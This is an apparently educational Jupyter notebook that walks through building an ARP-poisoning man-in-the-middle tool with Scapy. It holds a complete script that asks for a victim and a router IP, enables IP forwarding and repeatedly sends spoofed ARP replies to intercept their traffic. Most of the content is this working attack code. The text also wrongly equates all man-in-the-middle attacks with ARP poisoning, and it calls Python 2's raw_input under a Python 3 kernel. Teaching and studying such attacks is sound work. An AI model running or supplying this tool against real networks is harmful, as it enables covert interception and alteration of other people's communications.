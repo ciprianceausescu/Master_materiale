{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Build a Man-in-the-Middle Tool with Scapy and Python"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### What is a **Man-in-the-Middle** attack? \n",
    "\n",
    "**Man-in-the-Middle** attack is defined by the following situation: the attacker relays and possibly alters the communication between two parties who belive they are directly communicating with each other.\n",
    "\n",
    "**Man-in-the-Middle** = **ARP(Address Resolution Protocol) Poisoning Attack** = the attacker poisons the ARP cache of devices with the (48-bit) MAC address of their Ethernet NIC. Once the ARP cache has been successfully poisoned, each of the victim devices send all their packets to the attacker when communicating to the other device. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"mitm.png\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from IPython.display import Image\n",
    "from IPython.core.display import HTML \n",
    "Image(url= \"mitm.png\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### The steps for Man-in-the-Middle attack:\n",
    "\n",
    "1. Alice sends a message to Bob, which is intercepted by Mallory: **Alice \"Hi Bob, it's Alice. Give me your key.\" →     Mallory     Bob**\n",
    "\n",
    "2. Mallory relays this message to Bob; Bob cannot tell it is not really from Alice: **Alice     Mallory \"Hi Bob, it's Alice. Give me your key.\" →     Bob**\n",
    "\n",
    "3. Bob responds with his encryption key: **Alice     Mallory     ← [Bob's key] Bob**\n",
    "\n",
    "4. Mallory replaces Bob's key with her own, and relays this to Alice, claiming that it is Bob's key: **Alice     ← [Mallory's key] Mallory     Bob**\n",
    "\n",
    "5. Alice encrypts a message with what she believes to be Bob's key, thinking that only Bob can read it: **Alice \"Meet me at the bus stop!\" [encrypted with Mallory's key] →     Mallory     Bob**\n",
    "\n",
    "6. However, because it was actually encrypted with Mallory's key, Mallory can decrypt it, read it, modify it (if desired), re-encrypt with Bob's key, and forward it to Bob: **Alice     Mallory \"Meet me at the van down by the river!\" [encrypted with Bob's key] →     Bob**\n",
    "\n",
    "7. Bob thinks that this message is a secure communication from Alice.\n",
    "\n",
    "8. Bob goes to the van down by the river and gets robbed by Mallory.\n",
    "\n",
    "9. Alice does not know that Bob was robbed by Mallory thinking Bob is late.\n",
    "\n",
    "10. Not seeing Bob for a while, she determines something happened to Bob.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### How to implement a Man-in-the-Middle attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 1 - Importing modules and getting input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#Scapy is the most important module. This lets us craft and send custom packets, which is what enables us to send the ARP \n",
    "#responses.\n",
    "\n",
    "from scapy.all import *\n",
    "import sys\n",
    "import os\n",
    "import time\n",
    "\n",
    "\n",
    "#In order to make the attack we need to ask the user for an interface, victim IP address and the router IP. \n",
    "try:\n",
    "    interface = raw_input(\"[*] Enter Desired Interface: \")\n",
    "    victimIP = raw_input(\"[*] Enter Victim IP: \")\n",
    "    gateIP = raw_input(\"[*] Enter Router IP: \")\n",
    "except KeyboardInterrupt:\n",
    "    print(\"\\n[*] User Requested Shutdown\")\n",
    "    print(\"[*] Exiting...\")\n",
    "    sys.exit(1)\n",
    "    \n",
    "#Also, we enabled IP forwarding for the user.\n",
    "print(\"\\n[*] Enabling IP Forwarding...\\n\")\n",
    "os.system(\"echo 1 > /proc/sys/net/ipv4/ip_forward\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 2 - Getting the MAC addresses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#In order to create the ARP responses, we need the MAC addresses of the router and of the victim.\n",
    "#By creating an ARP request we can get the information needed.\n",
    "#The function has a parameter, which is the IP for which we need the MAC address.\n",
    "def get_mac(IP):\n",
    "    conf.verb = 0\n",
    "    ans, unans = srp(Ether(dst = \"ff:ff:ff:ff:ff:ff\")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)\n",
    "    for snd,rcv in ans:\n",
    "        return rcv.sprintf(r\"%Ether.src%\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 3 - Re-ARPing the targets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#After the attack we need to re-assign the target's addresses and we are disabling the IP forwarding.\n",
    "def reARP():\n",
    "    print(\"\\n[*] Restoring Targets...\")\n",
    "    victimMAC = get_mac(victimIP)\n",
    "    gateMAC = get_mac(gateIP)\n",
    "    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = \"ff:ff:ff:ff:ff:ff\", hwsrc = victimMAC), count = 7)\n",
    "    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = \"ff:ff:ff:ff:ff:ff\", hwsrc = gateMAC), count = 7)\n",
    "    print(\"[*] Disabling IP Forwarding...\")\n",
    "    os.system(\"echo 0 > /proc/sys/net/ipv4/ip_forward\")\n",
    "    print(\"[*] Shutting Down...\")\n",
    "    sys.exit(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 4 - Trickling the targets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#Using this function we are sending a single ARP reply to each of the targets telling them that we are the other \n",
    "#target, placing ourselves in between them.\n",
    "def trick(gm, vm):\n",
    "    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))\n",
    "    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 5 - Putting it all together"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#The mimt() function is the function that puts all together. First of all we are trying to get the victim and router MAC\n",
    "#addresses. If it is not possible we are closing the program, disabling the IP forwarding. It it is possible, in a while loop,\n",
    "#we can start sending replies at every 1.5 seconds, untill the user gives a keyboard interrupt (CTL+C).\n",
    "def mitm():\n",
    "    try:\n",
    "        victimMAC = get_mac(victimIP)\n",
    "    except Exception:\n",
    "        os.system(\"echo 0 > /proc/sys/net/ipv4/ip_forward\")            \n",
    "        print(\"[!] Couldn't Find Victim MAC Address\")\n",
    "        print(\"[!] Exiting...\")\n",
    "        sys.exit(1)\n",
    "    try:\n",
    "        gateMAC = get_mac(gateIP)\n",
    "    except Exception:\n",
    "        os.system(\"echo 0 > /proc/sys/net/ipv4/ip_forward\")            \n",
    "        print(\"[!] Couldn't Find Gateway MAC Address\")\n",
    "        print(\"[!] Exiting...\")\n",
    "        sys.exit(1)\n",
    "    print(\"[*] Poisoning Targets...\")       \n",
    "    while 1:\n",
    "        try:\n",
    "            trick(gateMAC, victimMAC)\n",
    "            time.sleep(1.5)\n",
    "        except KeyboardInterrupt:\n",
    "            reARP()\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 6 - Running the application"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "mitm()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Step 7 - Testing the application"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"1.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"1.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"2.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"2.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"3.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"3.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"4.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"4.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"5.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"5.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"6.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"6.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"7.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"7.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"8.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"8.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"9.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"9.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"10.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"10.PNG\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<img src=\"11.PNG\"/>"
      ],
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Image(url= \"11.PNG\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Bibliography\n",
    "\n",
    "**ARP Poisoning Attack and Mitigationg Techniques - https://www.cisco.com/c/en/us/products/collateral/switches/catalyst-6500-series-switches/white_paper_c11_603839.html**\n",
    "\n",
    "**Man-in-the-middle attack - https://en.wikipedia.org/wiki/Man-in-the-middle_attack**\n",
    "\n",
    "**A Survey of Man In The Middle Attacks** - https://ieeexplore.ieee.org/document/7442758/"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
